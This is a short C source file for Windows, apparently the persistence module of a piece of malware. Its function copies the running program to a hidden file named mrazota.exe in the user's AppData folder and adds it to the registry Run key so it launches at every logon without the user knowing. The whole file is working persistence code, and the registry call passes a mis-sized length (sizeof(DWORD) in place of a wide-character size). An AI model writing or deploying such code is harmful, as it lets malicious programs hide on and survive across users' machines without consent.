#include <Windows.h>
#include <malloc.h>
#include "getModulePath.h"

#include "installAndAutorun.h"
BOOL installAndAutorun() {
	DWORD install_len;
	install_len = ExpandEnvironmentStringsW(L"%APPDATA%\\mrazota.exe", NULL, 0);
	if (install_len) {
		LPWSTR install_path;
		install_path = _malloca(install_len * sizeof(WCHAR));
		if (install_path && ExpandEnvironmentStringsW(L"%APPDATA%\\mrazota.exe", install_path, install_len)) {
			DWORD modpath_len;
			LPWSTR modpath;
			modpath = getModulePath(&modpath_len);
			if (modpath) {
				if (wcscmp(install_path, modpath)) {
					if (CopyFileW(modpath, install_path, FALSE) && SetFileAttributesW(install_path, FILE_ATTRIBUTE_HIDDEN)) {
						HKEY run_key;
						if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &run_key)) {
							if (ERROR_SUCCESS != RegSetValueExW(run_key, L"mrazota", 0, REG_SZ, (BYTE*)install_path, install_len * sizeof(DWORD))) DeleteFileW(install_path);
							RegCloseKey(run_key);
						}
						else DeleteFileW(install_path);
					}
					else DeleteFileW(install_path);
				}
				else {
					free(modpath);
					_freea(install_path);
					return TRUE;
				};
			};
			free(modpath);
		};
		_freea(install_path);
	};
	return FALSE;
};